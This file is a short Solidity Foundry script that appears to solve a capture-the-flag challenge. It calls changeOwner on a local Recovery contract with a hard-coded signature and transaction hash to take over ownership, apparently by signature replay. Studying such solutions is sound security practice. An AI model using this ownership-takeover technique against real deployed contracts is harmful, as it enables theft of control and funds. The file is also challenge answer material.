// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "@forge-std-1.9.1/src/Script.sol";

import {Recovery} from "src/Recovery.sol";

contract Solve is Script {

    function run() public {
        vm.startBroadcast();

        Recovery challenge = Recovery(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        uint8 v=27;
        bytes32 r=bytes32(0x6d4adecad6b6ca18cb0386c67f00918043d65928871da10b3ffcd1f253c5148c);
        bytes32 s=bytes32(0x27fd15fd3ccd58286ad5d88572800398876f5d51e206f7425614785d4d2f065d);
        bytes32 tx_hash=bytes32(0xba3e76dd5523ca01461852ca8f36ff7a85994a391a6f690eac0d27e25dbd222a);
        challenge.changeOwner(v, r, s, tx_hash, msg.sender);
        vm.stopBroadcast();
    }
}
